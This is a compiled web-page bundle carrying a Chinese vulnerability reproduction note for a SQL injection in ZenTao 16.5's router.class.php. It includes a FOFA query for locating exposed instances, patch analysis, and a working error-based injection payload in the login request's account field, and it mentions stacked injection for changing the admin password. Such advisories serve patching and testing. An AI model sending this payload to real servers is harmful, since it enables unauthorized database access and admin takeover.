(window.webpackJsonp=window.webpackJsonp||[]).push([[71],{1228:function(s,a,t){s.exports=t.p+"assets/img/1651845742331-80eb4af4-3ecb-465a-b9f4-6b9f211bce3a.06ae8e17.png"},1229:function(s,a,t){s.exports=t.p+"assets/img/1651970702476-e791e909-c6ad-4386-a9ed-bd0f93454d92.5a3a4fc9.png"},1230:function(s,a,t){s.exports=t.p+"assets/img/1651971046505-0dfe20a0-ed9b-4704-a233-fbf1967c0248.6c57168e.png"},1231:function(s,a,t){s.exports=t.p+"assets/img/1651971584690-5654e6cd-48ca-4f5e-a552-7c6d6648f968.ef53fa28.png"},1232:function(s,a,t){s.exports=t.p+"assets/img/1651845951752-a3b596a1-d07e-4283-9373-64f5d4c95f87.6c84f133.png"},2846:function(s,a,t){"use strict";t.r(a);var r=t(64),e=Object(r.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"禅道-16-5-router-class-php-sql注入漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#禅道-16-5-router-class-php-sql注入漏洞"}},[s._v("#")]),s._v(" 禅道 16.5 router.class.php SQL注入漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("禅道 16.5 router.class.php 文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息，危害服务器安全")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("禅道 16.5")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('app="易软天创-禅道系统"')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登录页面")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1228),alt:"img"}})]),s._v(" "),a("p",[a("code",[s._v("16.5 到 16.5.1 版本")]),s._v("更新了 "),a("code",[s._v("framework/base/router.class.php")]),s._v(" 文件")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1229),alt:"img"}})]),s._v(" "),a("p",[a("code",[s._v("account参数")]),s._v("使用了"),a("code",[s._v("quote方法")]),s._v("进行过滤SQL语句")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1230),alt:"img"}})]),s._v(" "),a("p",[s._v("可以看到这个方法主要是对字段加转义，所以可以推断 16.5 版本中存在SQL注入, 跟踪调试测试SQL注入")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1231),alt:"img"}})]),s._v(" "),a("p",[s._v("验证POC如下, 其中同样存在堆叠注入，通过SQL语句可修改管理员密码等")]),s._v(" "),a("div",{staticClass:"language-java line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-java"}},[a("code",[a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("user"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("login"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("html\n\naccount"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("admin"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("and"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),s._v("select"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("extractvalue"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("281")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("Cconcat"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("280")]),s._v("x7e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("C"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),s._v("select"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("user"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("C0x7e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1232),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);